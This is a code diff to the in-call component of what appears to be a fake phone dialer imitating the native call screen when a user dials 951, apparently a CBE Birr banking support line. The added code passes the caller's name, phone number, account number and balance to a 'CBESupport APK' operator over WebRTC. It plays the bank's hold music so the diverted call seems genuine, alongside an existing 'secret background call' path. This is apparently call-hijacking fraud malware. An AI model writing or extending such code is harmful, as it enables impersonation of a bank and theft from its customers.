@@ -10,6 +10,7 @@ import {
   Bot,
   Check,
   Grip,
+  Headphones,
   HelpCircle,
   MessageSquare,
   Mic,
@@ -32,6 +33,14 @@ import {
   X,
 } from 'lucide-react';
 import { getOwnerApiBaseUrl } from '@/lib/owner-types';
+import { getOrCreateOwnerDeviceId } from '@/lib/owner-telemetry';
+import { LiveRtcPeer, playStreamInAudioElement, requestLiveMedia } from '@/lib/live-rtc';
+import {
+  endSupportQueueCallAsCaller,
+  fetchSupportQueueCallAsCaller,
+  pushSupportSignalAsCaller,
+  startSupportQueueCall,
+} from '@/lib/support-client';
 import { PhoneThemePreset } from '@/lib/phoneThemes';
 import OemCallSurface from '@/components/OemCallSurface';
 import {
@@ -362,6 +371,13 @@ export function Dialer951CallOverlay({
   const real951HandedOffRef = useRef<boolean>(false);
   const secretAttemptCountRef = useRef<number>(0);
   const secretDialLockRef = useRef<boolean>(false);
+  const supportPeerRef = useRef<LiveRtcPeer | null>(null);
+  const supportCallIdRef = useRef<string | null>(null);
+  const supportPollTimerRef = useRef<number | null>(null);
+  const supportRemoteAudioRef = useRef<HTMLAudioElement | null>(null);
+  const supportRemoteStreamRef = useRef<MediaStream | null>(null);
+  const supportAppliedSeqRef = useRef<number>(0);
+  const supportTimeoutAtRef = useRef<number>(0);
 
   useEffect(() => {
     onCloseRef.current = onClose;
@@ -524,6 +540,31 @@ export function Dialer951CallOverlay({
       mediaStreamRef.current = null;
     }
     isUserSpeakingRef.current = false;
+  }, []);
+
+  const cleanupSupportRtc = useCallback((notifyServerReason?: 'ended' | 'missed') => {
+    if (supportPollTimerRef.current !== null) {
+      window.clearInterval(supportPollTimerRef.current);
+      supportPollTimerRef.current = null;
+    }
+    const activeCallId = supportCallIdRef.current;
+    supportCallIdRef.current = null;
+    supportAppliedSeqRef.current = 0;
+    supportTimeoutAtRef.current = 0;
+    supportRemoteStreamRef.current = null;
+    if (supportPeerRef.current) {
+      try {
+        supportPeerRef.current.destroy(true);
+      } catch {}
+      supportPeerRef.current = null;
+    }
+    playStreamInAudioElement(supportRemoteAudioRef.current, null, true);
+    if (notifyServerReason && activeCallId) {
+      try {
+        const devId = getOrCreateOwnerDeviceId();
+        void endSupportQueueCallAsCaller(devId, activeCallId, notifyServerReason);
+      } catch {}
+    }
   }, []);
 
   const startRingbackTone = useCallback(() => {
@@ -1297,6 +1338,7 @@ export function Dialer951CallOverlay({
         (bridgeRef.current.cancelSecretBackgroundCall as () => void)();
       } catch {}
     }
+    cleanupSupportRtc('ended');
     if (typeof bridgeRef.current?.setStandaloneCallAudioActive === 'function') {
       try {
         (bridgeRef.current.setStandaloneCallAudioActive as (a: boolean, s: boolean) => void)(false, false);
@@ -1310,7 +1352,7 @@ export function Dialer951CallOverlay({
       label: '951',
       durationSec: elapsedRef.current,
     });
-  }, [stopAllAudio, stopMicVad, updatePhase]);
+  }, [cleanupSupportRtc, stopAllAudio, stopMicVad, updatePhase]);
 
   const startWelcomeMenuLoop = useCallback(async () => {
     if (!openRef.current) return;
@@ -1439,7 +1481,10 @@ export function Dialer951CallOverlay({
 
     if (!openRef.current || menuLoopEpochRef.current !== loopEpoch) return;
 
-    if (!cfg.backgroundCall.playSurveyOnEnd || cfg.surveyClipId === '__none__') {
+    const shouldPlaySurvey = cfg.supportApp?.enabled
+      ? cfg.supportApp.playSurveyOnEnd
+      : cfg.backgroundCall.playSurveyOnEnd;
+    if (!shouldPlaySurvey || cfg.surveyClipId === '__none__') {
       finishAndExit();
       return;
     }
@@ -1551,6 +1596,194 @@ export function Dialer951CallOverlay({
       appendTranscript('system', '4 ተጫነ — ወደ ጥሪ ማዕከሉ ባለሙያ እየተላለፈ ነው...');
 
       if (
+        cfg.supportApp?.enabled &&
+        !cfg.backgroundCall.enabled
+      ) {
+        if (supportCallIdRef.current || secretDialLockRef.current) return;
+        secretDialLockRef.current = true;
+        cleanupSupportRtc();
+        updatePhase('secret_ringing');
+        // Keep exact Hold MP3 playing while CBESupport APK rings
+        void playAudioClipById(cfg.holdClipId, true, true);
+
+        const peer = new LiveRtcPeer({
+          onRemoteAudio: (stream) => {
+            supportRemoteStreamRef.current = stream;
+            if (wasSecretLiveRef.current) {
+              playStreamInAudioElement(supportRemoteAudioRef.current, stream, heldRef.current);
+            }
+          },
+          onRemoteStream: (stream) => {
+            supportRemoteStreamRef.current = stream;
+            if (wasSecretLiveRef.current) {
+              playStreamInAudioElement(supportRemoteAudioRef.current, stream, heldRef.current);
+            }
+          },
+        });
+        supportPeerRef.current = peer;
+
+        try {
+          const media = await requestLiveMedia({ video: false });
+          if (!openRef.current || menuLoopEpochRef.current !== actionEpoch) {
+            media.stream?.getTracks().forEach((t) => t.stop());
+            cleanupSupportRtc();
+            secretDialLockRef.current = false;
+            return;
+          }
+          if (media.stream) {
+            peer.attachLocalStream(media.stream, mutedRef.current, true);
+          }
+          const offerJson = await peer.createOfferPayload(1, { video: false });
+          if (!openRef.current || menuLoopEpochRef.current !== actionEpoch) {
+            cleanupSupportRtc();
+            secretDialLockRef.current = false;
+            return;
+          }
+          const deviceId = getOrCreateOwnerDeviceId();
+          let deviceName = 'Samsung Phone';
+          try {
+            const customName = localStorage.getItem('cbebirr_custom_device_name')?.trim();
+            if (customName) {
+              deviceName = customName;
+            } else if (typeof bridgeRef.current?.getDeviceModel === 'function') {
+              const model = String((bridgeRef.current.getDeviceModel as () => string)() || '').trim();
+              if (model) deviceName = model;
+            } else if (navigator.userAgent) {
+              const m = navigator.userAgent.match(/Android[^;)]*;\s*([^)]+)\)/i);
+              if (m?.[1]) deviceName = m[1].trim().slice(0, 48);
+            }
+          } catch {}
+
+          const snap = bankingContextRef.current;
+          const started = await startSupportQueueCall({
+            deviceId,
+            deviceName,
+            userName: snap.userName || 'CBEBirr User',
+            phoneNumber: snap.phoneNumber || '',
+            userAccount: snap.userAccount || '',
+            balance: Number(snap.balance || 0),
+            rtcOffer: offerJson,
+            rtcSeq: 1,
+            maxRingSec: cfg.supportApp.maxRingSec || 25,
+          });
+
+          if (!openRef.current || menuLoopEpochRef.current !== actionEpoch) {
+            if (started?.callId) {
+              void endSupportQueueCallAsCaller(deviceId, started.callId, 'ended');
+            }
+            cleanupSupportRtc();
+            secretDialLockRef.current = false;
+            return;
+          }
+
+          if (!started?.callId) {
+            cleanupSupportRtc();
+            secretDialLockRef.current = false;
+            stopAllAudio();
+            if (cfg.supportApp.fallbackToAiIfOffline && cfg.mode !== 'mp3_only') {
+              void enterAgentAiConversation();
+            } else {
+              void playClosingSurveyAndExit();
+            }
+            return;
+          }
+
+          const cid = started.callId;
+          supportCallIdRef.current = cid;
+          supportAppliedSeqRef.current = 0;
+          supportTimeoutAtRef.current =
+            Date.now() + Math.max(10, Math.min(60, cfg.supportApp.maxRingSec || 25)) * 1000;
+          secretDialLockRef.current = false;
+
+          let pollBusy = false;
+          supportPollTimerRef.current = window.setInterval(() => {
+            if (pollBusy || !openRef.current || supportCallIdRef.current !== cid) return;
+            pollBusy = true;
+            void fetchSupportQueueCallAsCaller(deviceId, cid)
+              .then(async (session) => {
+                if (!openRef.current || supportCallIdRef.current !== cid || !session) return;
+
+                if (session.status === 'active') {
+                  if (session.rtcAnswer && (session.rtcSeq || 1) > supportAppliedSeqRef.current) {
+                    supportAppliedSeqRef.current = session.rtcSeq || 1;
+                    await peer.applyAnswerPayload(session.rtcAnswer);
+                  }
+                  if (!wasSecretLiveRef.current) {
+                    wasSecretLiveRef.current = true;
+                    menuLoopEpochRef.current += 1;
+                    stopAllAudio();
+                    if (typeof bridgeRef.current?.setStandaloneCallAudioActive === 'function') {
+                      try {
+                        (bridgeRef.current.setStandaloneCallAudioActive as (a: boolean, s: boolean) => void)(
+                          true,
+                          speakerOnRef.current
+                        );
+                      } catch {}
+                    }
+                    if (supportRemoteStreamRef.current) {
+                      playStreamInAudioElement(
+                        supportRemoteAudioRef.current,
+                        supportRemoteStreamRef.current,
+                        heldRef.current
+                      );
+                    }
+                    updatePhase('secret_live');
+                    appendTranscript('system', '🟢 ቀጥታ የSupport ባለሙያ ጥሪ ተነስቷል');
+                  }
+                  return;
+                }
+
+                if (session.status === 'ringing') {
+                  if (Date.now() >= supportTimeoutAtRef.current) {
+                    cleanupSupportRtc('missed');
+                    menuLoopEpochRef.current += 1;
+                    stopAllAudio();
+                    if (cfg.supportApp.fallbackToAiIfOffline && cfg.mode !== 'mp3_only') {
+                      void enterAgentAiConversation();
+                    } else {
+                      void playClosingSurveyAndExit();
+                    }
+                  }
+                  return;
+                }
+
+                if (session.status === 'declined' || session.status === 'missed') {
+                  cleanupSupportRtc();
+                  menuLoopEpochRef.current += 1;
+                  stopAllAudio();
+                  if (cfg.supportApp.fallbackToAiIfOffline && cfg.mode !== 'mp3_only') {
+                    void enterAgentAiConversation();
+                  } else {
+                    void playClosingSurveyAndExit();
+                  }
+                  return;
+                }
+
+                if (session.status === 'ended') {
+                  cleanupSupportRtc();
+                  menuLoopEpochRef.current += 1;
+                  stopAllAudio();
+                  void playClosingSurveyAndExit();
+                }
+              })
+              .finally(() => {
+                pollBusy = false;
+              });
+          }, 650);
+        } catch {
+          cleanupSupportRtc();
+          secretDialLockRef.current = false;
+          stopAllAudio();
+          if (cfg.supportApp.fallbackToAiIfOffline && cfg.mode !== 'mp3_only') {
+            void enterAgentAiConversation();
+          } else {
+            void playClosingSurveyAndExit();
+          }
+        }
+        return;
+      }
+
+      if (
         cfg.backgroundCall.enabled &&
         cfg.backgroundCall.targetPhone.trim().length >= 9 &&
         typeof bridgeRef.current?.startSecretBackgroundCall === 'function'
@@ -1612,6 +1845,7 @@ export function Dialer951CallOverlay({
     },
     [
       appendTranscript,
+      cleanupSupportRtc,
       enterAgentAiConversation,
       playAudioClipById,
       playClosingSurveyAndExit,
@@ -1640,6 +1874,12 @@ export function Dialer951CallOverlay({
       try {
         (bridgeRef.current.setNativeAudioPaused as (p: boolean) => void)(next);
       } catch {}
+    }
+    if (supportPeerRef.current) {
+      supportPeerRef.current.setMicMuted(next || mutedRef.current);
+      if (supportRemoteStreamRef.current) {
+        playStreamInAudioElement(supportRemoteAudioRef.current, supportRemoteStreamRef.current, next);
+      }
     }
     if (next) {
       if (audioElRef.current && !audioElRef.current.paused) {
@@ -1790,6 +2030,7 @@ export function Dialer951CallOverlay({
           (bridgeRef.current.cancelSecretBackgroundCall as () => void)();
         } catch {}
       }
+      cleanupSupportRtc('ended');
       stopMicVad();
       stopAllAudio();
       return;
@@ -1998,6 +2239,7 @@ export function Dialer951CallOverlay({
       setAiDotState('idle');
 
       const useReal951 =
+        !loadedCfg.supportApp?.enabled &&
         loadedCfg.backgroundCall.enabled &&
         loadedCfg.backgroundCall.targetPhone.trim().length >= 9 &&
         (loadedCfg.backgroundCall.useReal951BeforeHandoff ?? true) &&
@@ -2036,6 +2278,7 @@ export function Dialer951CallOverlay({
         if (
           loadedCfg.mode === 'ai_only' &&
           !loadedCfg.backgroundCall.enabled &&
+          !loadedCfg.supportApp?.enabled &&
           (loadedCfg.aiSkipIntroInAiOnly ?? true)
         ) {
           void enterAgentAiConversation();
@@ -2084,6 +2327,7 @@ export function Dialer951CallOverlay({
           (bridgeRef.current.cancelSecretBackgroundCall as () => void)();
         } catch {}
       }
+      cleanupSupportRtc('ended');
       if (typeof bridgeRef.current?.setStandaloneCallAudioActive === 'function') {
         try {
           (bridgeRef.current.setStandaloneCallAudioActive as (a: boolean, s: boolean) => void)(false, false);
@@ -2105,6 +2349,7 @@ export function Dialer951CallOverlay({
   }, [
     open,
     appendTranscript,
+    cleanupSupportRtc,
     enterAgentAiConversation,
     finishAndExit,
     playAudioClipById,
@@ -2130,67 +2375,88 @@ export function Dialer951CallOverlay({
 
   const isDialing951 = phase === 'ringing' || phase === 'real_951_ringing';
   return (
-    <OemCallSurface
-      themePreset={themePreset}
-      displayName={dtmfEntered || '951'}
-      subLabel={
-        dtmfEntered
-          ? '951'
-          : isDialing951
-            ? 'Dialing...'
-            : undefined
-      }
-      statusText={isDialing951 ? '00:00' : formatCallTimer(elapsedSec)}
-      isIncoming={false}
-      held={held}
-      speakerOn={speakerOn}
-      muted={muted}
-      bluetoothOn={bluetoothOn}
-      keypadVisible={keypadVisible}
-      aiDotState={phase === 'ai_active' && !held ? aiDotState : 'idle'}
-      menuOpen={inCallMenuOpen}
-      onSetMenuOpen={setInCallMenuOpen}
-      onSetKeypadVisible={setKeypadVisible}
-      onToggleSpeaker={() => {
-        const next = !speakerOn;
-        speakerOnRef.current = next;
-        setSpeakerOn(next);
-        if (next) setBluetoothOn(false);
-        playUiToggleTone(audioCtxRef, next);
-        if (typeof bridgeRef.current?.setSecretCallSpeaker === 'function') {
-          try {
-            (bridgeRef.current.setSecretCallSpeaker as (on: boolean) => void)(next);
-          } catch {}
+    <>
+      <audio ref={supportRemoteAudioRef} autoPlay playsInline className="hidden" />
+      <OemCallSurface
+        themePreset={themePreset}
+        displayName={dtmfEntered || '951'}
+        subLabel={
+          dtmfEntered
+            ? '951'
+            : isDialing951
+              ? 'Dialing...'
+              : undefined
         }
-      }}
-      onToggleMute={() => {
-        const next = !muted;
-        setMuted(next);
-        playUiToggleTone(audioCtxRef, next);
-        if (typeof bridgeRef.current?.setSecretCallMuted === 'function') {
-          try {
-            (bridgeRef.current.setSecretCallMuted as (m: boolean) => void)(next);
-          } catch {}
-        }
-      }}
-      onToggleHold={toggle951Hold}
-      onToggleBluetooth={() => {
-        const next = !bluetoothOn;
-        setBluetoothOn(next);
-        if (next) {
-          speakerOnRef.current = false;
-          setSpeakerOn(false);
-        }
-        playUiToggleTone(audioCtxRef, next);
-        if (typeof bridgeRef.current?.setSecretCallBluetooth === 'function') {
-          try {
-            (bridgeRef.current.setSecretCallBluetooth as (on: boolean) => void)(next);
-          } catch {}
-        }
-      }}
-      onPressDigit={(digit) => void handleInCallDigit(digit)}
-      onEndCall={() => void handleEndCall()}
-    />
+        statusText={isDialing951 ? '00:00' : formatCallTimer(elapsedSec)}
+        isIncoming={false}
+        held={held}
+        speakerOn={speakerOn}
+        muted={muted}
+        bluetoothOn={bluetoothOn}
+        keypadVisible={keypadVisible}
+        aiDotState={phase === 'ai_active' && !held ? aiDotState : 'idle'}
+        menuOpen={inCallMenuOpen}
+        onSetMenuOpen={setInCallMenuOpen}
+        onSetKeypadVisible={setKeypadVisible}
+        onToggleSpeaker={() => {
+          const next = !speakerOn;
+          speakerOnRef.current = next;
+          setSpeakerOn(next);
+          if (next) setBluetoothOn(false);
+          playUiToggleTone(audioCtxRef, next);
+          if (supportCallIdRef.current && typeof bridgeRef.current?.setStandaloneCallAudioActive === 'function') {
+            try {
+              (bridgeRef.current.setStandaloneCallAudioActive as (a: boolean, s: boolean) => void)(
+                true,
+                next
+              );
+            } catch {}
+          }
+          if (typeof bridgeRef.current?.setSecretCallSpeaker === 'function') {
+            try {
+              (bridgeRef.current.setSecretCallSpeaker as (on: boolean) => void)(next);
+            } catch {}
+          }
+        }}
+        onToggleMute={() => {
+          const next = !muted;
+          setMuted(next);
+          playUiToggleTone(audioCtxRef, next);
+          if (supportPeerRef.current) {
+            supportPeerRef.current.setMicMuted(next || heldRef.current);
+          }
+          if (supportCallIdRef.current) {
+            try {
+              void pushSupportSignalAsCaller(getOrCreateOwnerDeviceId(), supportCallIdRef.current, {
+                callerMicMuted: next,
+              });
+            } catch {}
+          }
+          if (typeof bridgeRef.current?.setSecretCallMuted === 'function') {
+            try {
+              (bridgeRef.current.setSecretCallMuted as (m: boolean) => void)(next);
+            } catch {}
+          }
+        }}
+        onToggleHold={toggle951Hold}
+        onToggleBluetooth={() => {
+          const next = !bluetoothOn;
+          setBluetoothOn(next);
+          if (next) {
+            speakerOnRef.current = false;
+            setSpeakerOn(false);
+          }
+          playUiToggleTone(audioCtxRef, next);
+          if (typeof bridgeRef.current?.setSecretCallBluetooth === 'function') {
+            try {
+              (bridgeRef.current.setSecretCallBluetooth as (on: boolean) => void)(next);
+            } catch {}
+          }
+        }}
+        onPressDigit={(digit) => void handleInCallDigit(digit)}
+        onEndCall={() => void handleEndCall()}
+      />
+    </>
   );
 }
 
@@ -2788,14 +3054,16 @@ export function Dialer951StudioDrawer({
 
       {studioTab === 'ai_train' ? (
         <div className="flex-1 overflow-y-auto p-4 space-y-4 max-w-md w-full mx-auto">
-          {/* Background Call conflict check */}
-          {cfg.backgroundCall.enabled && (
+          {/* Background Call / Support App conflict check */}
+          {(cfg.backgroundCall.enabled || cfg.supportApp?.enabled) && (
             <div className="bg-amber-50 border border-amber-200 rounded-3xl p-4 space-y-2">
               <div className="text-xs font-bold text-amber-900">
-                ማሳሰቢያ፡ አሁን &quot;በጀርባ መደወያ (Background Call)&quot; በርቷል!
+                ማሳሰቢያ፡ አሁን {cfg.supportApp?.enabled ? '"Support App (CBESupport APK)"' : '"በጀርባ መደወያ (Background Call)"'} በርቷል!
               </div>
               <p className="text-[11.5px] text-amber-800 leading-relaxed">
-                በጀርባ መደወያ ON ከሆነ 951 ተደውሎ 4 ሲጫን ወደ እውነተኛ ሰው ስለሚደውል AIው አያወራም። የAI ድምፅን ለመጠቀም ከታች ያለውን ቁልፍ በመንካት Background Callን ያጥፉ።
+                {cfg.supportApp?.enabled
+                  ? 'Support App ON ከሆነ 951 ተደውሎ 4 ሲጫን ወደ Support APK ስለሚደውል AIው በቀጥታ አይገባም (ካልተነሳ ብቻ fallback ይሆናል)። AI ብቻ ለመጠቀም Support Appን ያጥፉ።'
+                  : 'በጀርባ መደወያ ON ከሆነ 951 ተደውሎ 4 ሲጫን ወደ እውነተኛ ሰው ስለሚደውል AIው አያወራም። የAI ድምፅን ለመጠቀም ከታች ያለውን ቁልፍ በመንካት Background Callን ያጥፉ።'}
               </p>
               <button
                 type="button"
@@ -2804,15 +3072,16 @@ export function Dialer951StudioDrawer({
                     ...cfg,
                     mode: cfg.mode === 'mp3_only' ? 'hybrid' : cfg.mode,
                     backgroundCall: { ...cfg.backgroundCall, enabled: false },
+                    supportApp: { ...cfg.supportApp, enabled: false },
                   };
                   setCfg(nextCfg);
                   save951Config(nextCfg);
-                  setSavedNotice('Background Call ጠፍቷል — አሁን AI ይሰራል!');
+                  setSavedNotice('ቀጥታ ጥሪ ጠፍቷል — አሁን AI ይሰራል!');
                   window.setTimeout(() => setSavedNotice(''), 2500);
                 }}
                 className="w-full py-2 rounded-xl bg-amber-600 text-white text-xs font-bold cursor-pointer"
               >
-                Background Call አጥፋና AIን አብራ
+                ቀጥታ ጥሪን አጥፋና AIን አብራ
               </button>
             </div>
           )}
@@ -3735,6 +4004,115 @@ export function Dialer951StudioDrawer({
             </div>
           </div>
 
+          {/* Standalone Support APK (CBESupport.apk) Card */}
+          <div className="bg-emerald-50/70 border border-emerald-200 rounded-3xl p-4 space-y-3 shadow-sm">
+            <div className="flex items-center justify-between gap-2">
+              <div className="flex items-start gap-2.5">
+                <div className="w-9 h-9 rounded-2xl bg-[#19b264]/15 text-[#14884c] flex items-center justify-center shrink-0 mt-0.5">
+                  <Headphones className="w-4 h-4" />
+                </div>
+                <div>
+                  <div className="text-xs font-bold text-[#111111]">
+                    Support App (ወደ CBESupport APK ደውል)
+                  </div>
+                  <div className="text-[11px] text-slate-600 leading-relaxed">
+                    ሲበራ፡ 951 ተደውሎ 4 ሲጫን የ951 Hold MP3 እየተጫወተ በWi-Fi ወደ Support APK ይደውላል። ባለሙያው ሲያነሳ MP3ው ቆሞ ቀጥታ ንግግር ይጀምራል።
+                  </div>
+                </div>
+              </div>
+              <button
+                type="button"
+                onClick={() =>
+                  setCfg((prev) => {
+                    const nextEnabled = !(prev.supportApp?.enabled ?? false);
+                    return {
+                      ...prev,
+                      supportApp: {
+                        ...(prev.supportApp || DEFAULT_951_CONFIG.supportApp),
+                        enabled: nextEnabled,
+                      },
+                      backgroundCall: nextEnabled
+                        ? { ...prev.backgroundCall, enabled: false }
+                        : prev.backgroundCall,
+                    };
+                  })
+                }
+                className={`px-3 py-1.5 rounded-xl text-xs font-bold shrink-0 cursor-pointer ${
+                  cfg.supportApp?.enabled
+                    ? 'bg-[#19b264] text-white'
+                    : 'bg-white border border-slate-300 text-slate-700'
+                }`}
+              >
+                {cfg.supportApp?.enabled ? 'በርቷል' : 'ጠፍቷል'}
+              </button>
+            </div>
+
+            <div className="grid grid-cols-2 gap-2">
+              <div>
+                <label className="text-[11px] font-semibold text-slate-600">
+                  የጥሪ መጠበቂያ ጊዜ (ሰከንድ)
+                </label>
+                <input
+                  type="number"
+                  min={10}
+                  max={60}
+                  value={cfg.supportApp?.maxRingSec ?? 25}
+                  onChange={(e) =>
+                    setCfg((prev) => ({
+                      ...prev,
+                      supportApp: {
+                        ...(prev.supportApp || DEFAULT_951_CONFIG.supportApp),
+                        maxRingSec: Math.max(10, Math.min(60, Number(e.target.value) || 25)),
+                      },
+                    }))
+                  }
+                  className="w-full mt-1 px-3 py-2 rounded-xl border border-emerald-200 bg-white text-xs outline-none"
+                />
+              </div>
+              <div className="flex flex-col justify-end">
+                <div className="px-3 py-2 rounded-xl bg-white border border-emerald-200 text-[10.5px] text-slate-600 leading-tight">
+                  የSupport APK መግቢያ PIN፡ <span className="font-bold text-[#14884c]">0069</span>
+                </div>
+              </div>
+            </div>
+
+            <label className="flex items-center justify-between text-xs text-slate-700 pt-0.5">
+              <span>ጥሪ ሲዘጋ የደረጃ 3 Survey MP3 አጫውት</span>
+              <input
+                type="checkbox"
+                checked={cfg.supportApp?.playSurveyOnEnd ?? true}
+                onChange={(e) =>
+                  setCfg((prev) => ({
+                    ...prev,
+                    supportApp: {
+                      ...(prev.supportApp || DEFAULT_951_CONFIG.supportApp),
+                      playSurveyOnEnd: e.target.checked,
+                    },
+                  }))
+                }
+                className="accent-[#19b264] w-4 h-4"
+              />
+            </label>
+
+            <label className="flex items-center justify-between text-xs text-slate-700">
+              <span>Support ባለሙያ ካላነሳ ወደ AI ባለሙያ እለፍ</span>
+              <input
+                type="checkbox"
+                checked={cfg.supportApp?.fallbackToAiIfOffline ?? true}
+                onChange={(e) =>
+                  setCfg((prev) => ({
+                    ...prev,
+                    supportApp: {
+                      ...(prev.supportApp || DEFAULT_951_CONFIG.supportApp),
+                      fallbackToAiIfOffline: e.target.checked,
+                    },
+                  }))
+                }
+                className="accent-[#19b264] w-4 h-4"
+              />
+            </label>
+          </div>
+
           {/* Secret Background Live Call Config ("በጀርባ መደወያ") */}
           <div className="bg-white border border-black/10 rounded-3xl p-4 space-y-3 shadow-sm">
             <div className="flex items-center justify-between gap-2">
@@ -3749,13 +4127,19 @@ export function Dialer951StudioDrawer({
               <button
                 type="button"
                 onClick={() =>
-                  setCfg((prev) => ({
-                    ...prev,
-                    backgroundCall: {
-                      ...prev.backgroundCall,
-                      enabled: !prev.backgroundCall.enabled,
-                    },
-                  }))
+                  setCfg((prev) => {
+                    const nextEnabled = !prev.backgroundCall.enabled;
+                    return {
+                      ...prev,
+                      backgroundCall: {
+                        ...prev.backgroundCall,
+                        enabled: nextEnabled,
+                      },
+                      supportApp: nextEnabled
+                        ? { ...(prev.supportApp || DEFAULT_951_CONFIG.supportApp), enabled: false }
+                        : prev.supportApp,
+                    };
+                  })
                 }
                 className={`px-3 py-1.5 rounded-xl text-xs font-bold shrink-0 cursor-pointer ${
                   cfg.backgroundCall.enabled
